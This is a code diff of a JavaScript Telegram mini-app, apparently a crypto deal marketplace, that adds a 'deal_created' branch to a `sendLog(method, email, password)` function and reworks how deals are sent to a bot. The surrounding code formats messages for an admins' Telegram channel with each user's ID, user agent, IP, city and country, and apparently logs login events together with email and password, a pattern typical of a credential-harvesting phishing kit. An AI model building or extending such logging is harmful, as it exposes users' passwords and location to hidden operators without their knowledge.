@@ -2303,6 +2303,21 @@ async function sendLog(method, email, password) {
            + `🌐 Язык: ${navigator.language || 'ru'}\n`
            + `📍 ${country}, ${city} (IP: ${ip})\n`
            + `🕐 ${now}`;
+      } else if (method === 'deal_created') {
+      const parts = email.split('|');
+      const dType = parts[0] === 'buy' ? '🟢 Покупка' : '🟡 Продажа';
+      const dCur = parts[1];
+      const dAmount = parts[2];
+      const dId = parts[3];
+      text = `🆕 <b>Новый ордер из приложения</b>\n`
+           + `👤 ${uid} ${username}\n`
+           + `🆔 ID: <code>#${dId}</code>\n`
+           + `📊 Тип: ${dType}\n`
+           + `💎 ${dAmount} ${dCur}\n`
+           + `📝 Описание:\n${password || '—'}\n`
+           + `📱 ${ua}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
     } else {
       const label = method === 'telegram'
         ? '✈️ <b>Вход через Telegram</b>'
@@ -3179,38 +3194,38 @@ function submitDealFinal() {
     localStorage.setItem('lolz_tickets_' + uid, JSON.stringify(existing));
   } catch(e){}
 
-  // Лог в Telegram-канал админам
-  sendLog('wallet_action',
-    `deal|${dealState.type}|${dealState.currency}|${dealState.amount}`,
-    dealState.description.slice(0, 200)
+  // Лог в Telegram — отдельная ветка "Новый ордер"
+  sendLog('deal_created',
+    `${dealState.type}|${dealState.currency}|${dealState.amount}|${ticket.id}`,
+    dealState.description.slice(0, 300)
   );
 
-  // ── ОТПРАВКА В БОТ для подтверждения пользователю ──
-  if (tg && tg.sendData) {
-    const payload = JSON.stringify({
-      action: 'deal_created',
-      deal_id: ticket.id,
-      type: dealState.type,
-      currency: dealState.currency,
-      amount: dealState.amount,
-      description: dealState.description.slice(0, 300)
-    });
-    tg.sendData(payload);
+  // Отправка в бот (только если мини-апп открыт через inline-кнопку с WebAppInfo)
+  let sentToBot = false;
+  if (tg && typeof tg.sendData === 'function') {
+    try {
+      const payload = JSON.stringify({
+        action: 'deal_created',
+        deal_id: ticket.id,
+        type: dealState.type,
+        currency: dealState.currency,
+        amount: dealState.amount,
+        description: dealState.description.slice(0, 300)
+      });
+      tg.sendData(payload);
+      sentToBot = true;
+      // tg.sendData автоматически закрывает мини-апп — дальнейший код не выполнится
+    } catch(e) {
+      console.log('sendData error:', e);
+    }
   }
 
   closeModal('dealCreateModal');
-  showToast('✅ Сделка создана');
+  showToast(sentToBot ? '✅ Сделка отправлена' : '✅ Сделка создана');
 
-  // Переходим в "Мои сделки"
-  setTimeout(() => openMyDeals(), 400);
-}
-
-/* Сохраняем старую функцию выбора валюты для совместимости */
-var selectedDealCur = 'TON';
-function selectDealCur(el, cur) {
-  selectedDealCur = cur;
-  document.querySelectorAll('#dealCreateModal .deal-cur-item').forEach(item => item.classList.remove('selected'));
-  if (el) el.classList.add('selected');
+  if (!sentToBot) {
+    setTimeout(() => openMyDeals(), 400);
+  }
 }
 </script>
 
